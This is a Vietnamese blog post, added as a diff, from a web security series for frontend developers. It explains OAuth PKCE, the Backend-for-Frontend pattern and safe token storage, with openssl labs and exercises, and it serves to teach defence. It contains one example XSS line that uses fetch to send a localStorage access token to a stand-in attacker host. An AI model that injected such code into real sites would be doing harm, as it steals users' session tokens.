@@ -1,0 +1,216 @@
+---
+title: 'Web Security for Frontend Devs · Part 24 — OAuth 2.0 & OIDC for SPAs: PKCE & the BFF Pattern'
+description: 'Bonus track: why the implicit flow is dead, how Authorization Code + PKCE stops code interception, why PKCE does nothing for token storage, and the BFF pattern that keeps tokens out of the browser. With a live PKCE simulator.'
+pubDate: 2026-06-27
+tags: [web-security, frontend, oauth, web_security_10]
+series: web-security
+seriesOrder: 24
+draft: false
+---
+
+> **Phần 24 — Nhánh bonus** trong series Web Security for Frontend Devs. Trước: Tiếp:
+
+"Đăng nhập với Google" trong một SPA nghe đơn giản, nhưng đây là chỗ frontend dev hay ship lỗ hổng nghiêm trọng nhất — vì lời khuyên trên mạng phần lớn đã **lỗi thời**. Implicit flow từng được dạy là chuẩn cho SPA giờ đã **bị gỡ bỏ** trong OAuth 2.1. Và kể cả khi bạn dùng flow đúng, vẫn còn câu hỏi ai cũng làm sai: **token lưu ở đâu?**
+
+Phần này cô đọng đồng thuận hiện tại (OAuth 2.1, RFC 9700 Security BCP, và BCP "OAuth for Browser-Based Apps"): **Authorization Code + PKCE** cho mọi client, và **BFF (Backend-for-Frontend)** để giữ token *ra khỏi* trình duyệt.
+
+---
+
+## Vì sao implicit flow chết
+
+Implicit flow trả **access token thẳng trong URL fragment**:
+
+```text
+https://app.example/callback#access_token=eyJ...&token_type=Bearer
+```
+
+Token-trong-URL rò ra khắp nơi: lịch sử trình duyệt, header `Referer`, log server, extension. Không có bước trao đổi nào để ràng buộc token với client. OAuth 2.1 **xoá hẳn** implicit flow (và ROPC). Quy tắc mới đơn giản: **mọi client có người dùng + trình duyệt → Authorization Code + PKCE**.
+
+---
+
+## PKCE — chống chặn authorization code
+
+SPA là **public client**: nó chạy hoàn toàn trong trình duyệt nên **không giữ được `client_secret`**. Vậy làm sao chứng minh bên đổi `code` lấy token chính là bên khởi tạo flow? Đó là việc của **PKCE (Proof Key for Code Exchange)**:
+
+```text
+1. App tạo code_verifier ngẫu nhiên (bí mật, ở lại client).
+2. App tính code_challenge = BASE64URL(SHA-256(code_verifier)).
+3. /authorize?…&code_challenge=<challenge>&code_challenge_method=S256
+4. IdP lưu challenge, redirect về kèm ?code=…
+5. App POST /token { code, code_verifier }   ← gửi verifier gốc lần này
+6. IdP kiểm SHA-256(code_verifier) === challenge đã lưu → cấp token.
+```
+
+Mấu chốt: kẻ tấn công chặn được `code` (qua referrer, app độc, mạng) **vẫn không đổi được token** vì không có `code_verifier` — và `code_challenge` chỉ là hash một chiều, không suy ngược ra verifier. OAuth 2.1 **bắt buộc PKCE cho mọi client**, không chỉ SPA.
+
+---
+
+## Nhưng PKCE KHÔNG giải quyết việc lưu token
+
+Đây là hiểu lầm tốn kém nhất. PKCE bảo vệ `code` **trên đường truyền** — nó kết thúc nhiệm vụ ngay khi app nhận được token. Sau đó token nằm ở đâu, và XSS đọc được không, là **bài toán khác hoàn toàn**.
+
+```js
+// XSS chạy trên origin bạn — PKCE không liên quan gì ở đây
+fetch('https://evil.example/c?t=' + localStorage.getItem('access_token'));
+```
+
+Nếu token ở `localStorage`/`sessionStorage`, **bất kỳ XSS nào** ([Phần 2](/blog/web-security-02-xss-cross-site-scripting/)) đọc và đánh cắp được ngay, dùng suốt vòng đời token. Đây là lý do quy tắc cứng: **không bao giờ để token trong `localStorage`/`sessionStorage`**.
+
+---
+
+## BFF — chuẩn vàng: giữ token ngoài trình duyệt
+
+Cách mạnh nhất là **đừng để token vào trình duyệt chút nào**. Mẫu **Backend-for-Frontend (BFF)**: một backend nhẹ đóng vai *confidential client*, chạy trọn flow OAuth, **lưu token phía server**, và chỉ phát cho trình duyệt một **cookie phiên `HttpOnly`**.
+
+```text
+SPA ──(1) bắt đầu login──▶ BFF
+BFF ──(2) Authorization Code + PKCE──▶ Identity Provider
+BFF ◀─(3) tokens─────────────────────  IdP
+BFF ──(4) Set-Cookie: sid=…; HttpOnly; Secure; SameSite=Strict──▶ trình duyệt
+SPA ──(5) gọi /api (kèm cookie)──▶ BFF ──(gắn access token)──▶ Resource Server
+```
+
+Vì sao đây là chuẩn vàng:
+
+- Trình duyệt **không bao giờ thấy** access/refresh token — XSS không có gì để trộm và replay sau này.
+- Cookie là `HttpOnly` → JS **không đọc được** (`document.cookie` trả rỗng).
+- BFF giữ `client_secret`, làm **refresh token rotation** và thu hồi phía server.
+
+> Phân biệt quan trọng (theo BCP): **BFF thật** không bao giờ chuyển token cho frontend. Một **Token-Mediating Backend (TMB)** — backend lấy token rồi *đưa lại* cho frontend — **không** phải BFF và mất gần hết lợi ích. Chỉ proxy, đừng chuyển token.
+
+Nhược điểm: thêm một backend. Đánh đổi xứng đáng cho app có dữ liệu nhạy cảm. Lưu ý: BFF dùng cookie nên bạn **vẫn phải** chống CSRF ([Phần 4](/blog/web-security-04-csrf-samesite-cookies/)) bằng `SameSite` + token.
+
+---
+
+## Nếu thật sự không thể có BFF
+
+Hãy giảm thiểu: dùng **Authorization Code + PKCE**, giữ token **trong bộ nhớ (biến JS)**, không bao giờ `localStorage`. In-memory mất khi reload và không nằm trong storage — nhưng **không miễn nhiễm XSS**: script độc đang chạy vẫn đọc biến hoặc hook `fetch`. Bù bằng access token **đời ngắn**, refresh **rotation**, và phòng XSS thật chặt ([Phần 2](/blog/web-security-02-xss-cross-site-scripting/), [Phần 3](/blog/web-security-03-content-security-policy/)).
+
+---
+
+## Thử ngay — trình mô phỏng PKCE & lưu token
+
+Panel 1: bật/tắt PKCE rồi cho **kẻ tấn công chặn `code`** — xem vì sao không PKCE thì token bị trộm, còn có PKCE thì đổi token bị từ chối (challenge tính bằng **SHA-256 thật**). Panel 2: chọn nơi lưu token rồi chạy payload XSS mô phỏng và xem nó trộm được gì.
+
+<iframe
+  src="/tools/oauth-pkce-demo/"
+  title="Interactive OAuth PKCE and token storage simulator"
+  loading="lazy"
+  style="width:100%;height:1180px;border:1px solid var(--color-border);border-radius:8px;background:#0a0a0a;"
+></iframe>
+
+Mở demo đầy đủ:
+
+---
+
+## Lab thực hành — tự tính PKCE
+
+Không cần IdP — chứng minh chính phép toán PKCE bằng tay.
+
+### Lab 1 — tạo verifier & challenge
+
+```bash
+# code_verifier: 43–128 ký tự, base64url của ngẫu nhiên
+verifier=$(openssl rand -base64 32 | tr '/+' '_-' | tr -d '=')
+echo "verifier  = $verifier"
+
+# code_challenge = base64url(SHA256(verifier)) — phương thức S256
+challenge=$(printf '%s' "$verifier" | openssl dgst -binary -sha256 | openssl base64 | tr '/+' '_-' | tr -d '=')
+echo "challenge = $challenge"
+```
+
+### Lab 2 — vì sao kẻ tấn công thua
+
+```bash
+# kẻ tấn công có 'code' nhưng đoán một verifier khác:
+fake=$(openssl rand -base64 32 | tr '/+' '_-' | tr -d '=')
+fakechallenge=$(printf '%s' "$fake" | openssl dgst -binary -sha256 | openssl base64 | tr '/+' '_-' | tr -d '=')
+echo "stored challenge   = $challenge"
+echo "attacker's SHA256  = $fakechallenge"
+# hai dòng KHÁC nhau → IdP trả invalid_grant → code vô dụng
+```
+
+Đã chứng minh: chỉ chủ của `code_verifier` gốc mới đổi được `code` lấy token.
+
+### Lab 3 — token trong storage là mồi ngon
+
+```js
+// dán vào Console của một trang BẠN sở hữu để thấy bề mặt rò rỉ:
+localStorage.setItem('access_token', 'demo.„secret".jwt');
+// một dòng XSS là đủ:
+console.log('stolen →', localStorage.getItem('access_token'));
+```
+
+Đã chứng minh: bất cứ JS nào trên origin cũng đọc được storage — đừng để token ở đó.
+
+---
+
+## Checklist phòng tránh
+
+1. Dùng **Authorization Code + PKCE (S256)**; **không bao giờ** implicit flow.
+2. Ưu tiên **BFF** — token ở server, trình duyệt chỉ giữ cookie `HttpOnly`.
+3. **Không** `localStorage`/`sessionStorage` cho token; không BFF thì in-memory.
+4. Access token **đời ngắn** + refresh **rotation**; thu hồi phía server.
+5. Khớp **redirect URI tuyệt đối** (OAuth 2.1, không wildcard); dùng `state` chống CSRF, `nonce` (OIDC) chống replay.
+6. BFF dùng cookie → vẫn cần phòng **CSRF** + phòng **XSS** nhiều lớp.
+
+---
+
+## Liên hệ các phần trước
+
+Đây là phần sâu của lưu auth-token ([Phần 5](/blog/web-security-05-auth-tokens-secure-storage/)). BFF biến bài toán thành cookie phiên — nên [SameSite & CSRF (Phần 4)](/blog/web-security-04-csrf-samesite-cookies/) quay lại thành thiết yếu. Và vì XSS đánh bại *mọi* sơ đồ lưu token phía client, [XSS (Phần 2)](/blog/web-security-02-xss-cross-site-scripting/) + [CSP (Phần 3)](/blog/web-security-03-content-security-policy/) vẫn là nền móng.
+
+---
+
+## Bài tập / Exercises
+
+**1.** Đồng đội nói "ta có PKCE rồi nên để token trong `localStorage` cũng ổn." Sai ở đâu?
+
+<details>
+<summary>Lời giải</summary>
+
+PKCE chỉ bảo vệ authorization `code` **trên đường truyền** lúc đổi token; nó không liên quan tới nơi lưu token. Token trong `localStorage` bị **bất kỳ XSS nào** đọc và đánh cắp. Hai vấn đề tách biệt — cần cả PKCE *và* lưu trữ an toàn (lý tưởng là BFF).
+</details>
+
+**2.** Trong simulator, tắt PKCE rồi chặn `code`. Vì sao token bị trộm, và bật PKCE chặn cách nào?
+
+<details>
+<summary>Lời giải</summary>
+
+Không PKCE, `code` đơn lẻ đủ để đổi token, nên kẻ chặn được nó lấy luôn token. Bật PKCE, IdP đòi `code_verifier` khớp `code_challenge` đã lưu (qua SHA-256); kẻ tấn công không có verifier nên đổi token thất bại (`invalid_grant`).
+</details>
+
+**3.** Phân biệt **BFF** thật và **Token-Mediating Backend**. Vì sao chỉ một cái bảo vệ token khỏi XSS?
+
+<details>
+<summary>Lời giải</summary>
+
+BFF giữ token **hoàn toàn** ở server, trình duyệt chỉ có cookie `HttpOnly` → XSS không có token để trộm. TMB lấy token rồi **đưa lại** cho frontend, nên token lại vào tầm JS và XSS — mất gần hết lợi ích. Chỉ BFF (proxy, không chuyển token) mới bảo vệ thật.
+</details>
+
+Nâng cao:Trong simulator Panel 2, so sánh "in-memory" và "BFF": giải thích một câu vì sao XSS đang chạy vẫn lạm dụng được phiên ở *cả hai*, nhưng chỉ một cái cho phép **đánh cắp** token dùng lại sau.
+
+---
+
+## Điểm chính
+
+- Implicit flow đã **chết** (OAuth 2.1 gỡ bỏ); dùng **Authorization Code + PKCE** cho mọi client.
+- **PKCE** chống chặn `code` bằng cặp verifier/challenge SHA-256 — nhưng **không** lo việc lưu token.
+- **Không bao giờ** để token ở `localStorage`/`sessionStorage`; XSS lấy ngay.
+- **BFF** là chuẩn vàng: token ở server, trình duyệt chỉ giữ cookie `HttpOnly` → không có gì để XSS trộm.
+- BFF dùng cookie nên vẫn cần phòng **CSRF**; mọi sơ đồ client vẫn cần phòng **XSS**.
+
+---
+
+## Nguồn
+
+- IETF — [OAuth 2.1 draft](https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/) và [RFC 9700: OAuth 2.0 Security BCP](https://datatracker.ietf.org/doc/rfc9700/).
+- IETF — [OAuth 2.0 for Browser-Based Apps (BCP)](https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/) — phân biệt BFF vs Token-Mediating Backend.
+- IETF — [RFC 7636: PKCE](https://datatracker.ietf.org/doc/html/rfc7636).
+- Auth0 — [Things developers get wrong about the BFF pattern](https://auth0.com/blog/things-developers-get-wrong-about-the-backend-for-frontend-pattern/).
+
+---
+
+## Series
+
+Các phần bonus xếp trên mười phần lõi và nhánh nâng cao. Sợi chỉ từ [Phần 5](/blog/web-security-05-auth-tokens-secure-storage/): **một token là một bí mật mang được — chỗ an toàn nhất cho bí mật là nơi kẻ tấn công không với tới, tức là ngoài trình duyệt**.
